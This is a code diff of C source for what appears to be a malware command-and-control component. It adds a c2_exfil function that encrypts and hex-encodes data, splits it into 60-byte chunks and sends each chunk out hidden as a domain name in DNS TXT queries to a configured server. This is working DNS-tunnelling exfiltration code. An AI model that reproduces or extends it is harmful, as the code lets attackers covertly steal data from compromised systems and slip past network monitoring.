@@ -472,28 +472,52 @@ int c2_send(char* data, int len) {
 }
 
 
-// TODO: needs lots of clean up
-// TODO: need to rename this too
-// TODO: encrypt and base64 encode
+// Converts raw bytes to printable hex string
+char* bytes_to_hex(unsigned char *bytes, int len) {
+    char* out = (char*) Malloc(2*len + 1); // every byte is represented by 2 hex chars (+1 for null byte)
+    for(int i=0; i < len; i++) {
+        sprintf((unsigned char*) out + 2*i, "%02x", (unsigned char) bytes[i]);
+    }
+    out[2*len] = '\0';
+    return out;
+}
+
+
 // Note: looks like name can be ~60 bytes (found from testing)
-int c2_send2(char* msg, int len) {
+int c2_exfil(char* msg, int len) {
     DNS_STATUS status;
     DNS_QUERY_REQUEST request  = {0};
     PDNS_RECORD result         = NULL;
 
+    int encrypted_len = 0;
+    char* encrypted = NULL;
+    char* msgFinal  = NULL;
+    
+    // Encrypt and hex encode message
+    encrypted = Encrypt(msg, len, &encrypted_len);
+    if (encrypted == NULL) {
+        c2_log("c2_send2:Encrypt failed\n");
+        return 0;
+    }
+    msgFinal = bytes_to_hex(encrypted, encrypted_len);
+    if (msgFinal == NULL) {
+        Free(encrypted);
+        c2_log("c2_send2:base64 failed\n");
+        return 0;
+    }
+
     int num_sent = 0;
-    char buffer[128] = {0};
-    while (num_sent < len) {
-        // Copy chunk of message to buffer which we'll use as domain name to query
-        int bytes_left = len - num_sent;
+    char buffer[256] = {0};
+    int finalLen = strlen(msgFinal);
+    while (num_sent < finalLen) {
+        // Copy chunk of message to buffer, which we'll use as domain name to query
+        int bytes_left = finalLen - num_sent;
         int amount_to_copy = (bytes_left < 60) ? bytes_left : 60;
         memset(buffer, 0, 128);
-        strncpy(buffer, msg + num_sent, amount_to_copy);
-        strcat(buffer, ".com"); // domain names need a top-level domain
+        strncpy(buffer, msgFinal + num_sent, amount_to_copy);
+        strcat(buffer, ".com"); // need a top-level domain
 
         // Send query
-        loop:
-        Sleep(500); // so we dont spam connections
         status = DnsQuery_A(buffer, DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE | DNS_QUERY_USE_TCP_ONLY, pSrvList, &result, NULL);
         if (status != ERROR_SUCCESS) {
             c2_log("[!] c2_send2:DnsQuery_A failed with status %d\n", status);
@@ -501,19 +525,14 @@ int c2_send2(char* msg, int len) {
         }
 
         // Get response
-        DNS_RECORD record = result[0];
-        
-        // If we get a NOP response, go back into the loop
-        if (strcmp(record.Data.TXT.pStringArray[0], "NOP") == 0) {
-            c2_log("NOP\n");
-            goto loop;
-        }
-
-        c2_log("Name: %s\nData: %s\n", record.pName, record.Data.TXT.pStringArray[0]);
-        
-        num_sent += amount_to_copy;
+        // DNS_RECORD record = result[0];
         DnsRecordListFree(result, DnsFreeRecordList);
+
+        num_sent += amount_to_copy;
     }
+
+    Free(encrypted);
+    Free(msgFinal);
 
     c2_log("[+] DNS query success");
     return num_sent;
